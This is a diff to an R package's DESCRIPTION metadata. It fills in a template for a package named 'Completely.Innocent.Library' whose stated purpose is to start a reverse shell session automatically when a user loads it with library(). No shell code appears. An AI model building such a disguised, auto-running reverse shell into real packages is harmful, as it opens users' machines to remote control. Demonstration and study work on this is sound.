@@ -1,11 +1,13 @@
 Package: Completely.Innocent.Library
 Type: Package
-Title: What the Package Does (Title Case)
+Title: HackRshell Client Autorun
 Version: 0.1.0
-Author: Who wrote it
-Maintainer: The package maintainer <yourself@somewhere.net>
-Description: More about what it does (maybe more than one line)
-    Use four spaces when indenting paragraphs within the Description.
-License: What license is it under?
+Author: Ian Roberts
+Maintainer: Ian Roberts <ijr2399@gmail.com>
+Description: This library contains the client function from the 
+    HackRshell package. It is set up to execute this client function
+    and attempt to start a reverse shell session when the user attaches
+    the package with the library() command. 
+License: GNU Lesser General Public License (LGPL) v2.1
 Encoding: UTF-8
 LazyData: true
